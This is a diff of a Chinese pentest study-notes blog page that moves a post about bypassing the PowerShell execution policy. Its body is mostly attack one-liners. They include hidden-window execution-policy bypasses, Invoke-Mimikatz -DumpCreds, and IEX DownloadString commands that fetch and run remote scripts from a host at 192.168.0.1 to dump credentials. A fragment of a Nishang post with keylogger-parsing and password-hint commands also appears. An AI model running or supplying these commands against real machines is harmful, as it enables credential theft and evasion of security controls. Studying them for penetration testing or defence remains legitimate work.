@@ -280,163 +280,6 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
-<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
-</blockquote>
-<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
-<li><p>本地绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
-<li><p>本地隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
-<li><p>本地导入ps1脚本，并执行函数.</p>
-<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
-<li><p>本地使用IEX下载远程ps1绕过执行.</p>
-<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
-<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
-<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
                 <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">Nishang模块简介及演示</a></h1>
         
 
@@ -557,6 +400,163 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
 <p>获取用户密码的提示信息，如果有的话。</p>
 </blockquote>
 <pre><code>Get-PassHints</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/1566846777/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/1566846777/" itemprop="url">绕过Powershell执行策略执行ps脚本。</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="绕过Powershell执行策略执行ps脚本。"><a href="#绕过Powershell执行策略执行ps脚本。" class="headerlink" title="绕过Powershell执行策略执行ps脚本。"></a>绕过Powershell执行策略执行ps脚本。</h1><blockquote>
+<p>由于powershell默认是不允许执行ps脚本的<strong>* 管理员可以改为允许 *</strong>，但ps脚本又是渗透测试中非常有用也非常必要的工具，所以想办法绕过执行策略还是非常有必要的。</p>
+</blockquote>
+<h2 id="总结如下"><a href="#总结如下" class="headerlink" title="总结如下"></a>总结如下</h2><ul>
+<li><p>本地绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -file xxx.ps1</code></pre></li>
+<li><p>本地隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowsstyle hideden -nologo -nonlnteractive -noprofile -file xxx.ps1</code></pre></li>
+<li><p>本地导入ps1脚本，并执行函数.</p>
+<pre><code>powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-Mimikatz.ps1&quot;;Invoke-Mimikatz -DumpCreds</code></pre></li>
+<li><p>本地使用IEX下载远程ps1绕过执行.</p>
+<pre><code>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.0.1/mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</code></pre></li>
+<li><p>本地使用IEX下载远程ps1隐藏绕过权限执行.</p>
+<pre><code>powershell -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(new-object system.net.webclient).downloadstring(&quot;http://192.168.0.1/1025.ps1&quot;)    </code></pre><p>  <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/07/27/%E7%BB%95%E8%BF%87Powershell%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E6%89%A7%E8%A1%8Cps%E8%84%9A%E6%9C%AC%E3%80%82/1.jpg" alt="avatar"></p>
+</li>
+</ul>
+
           
         
       
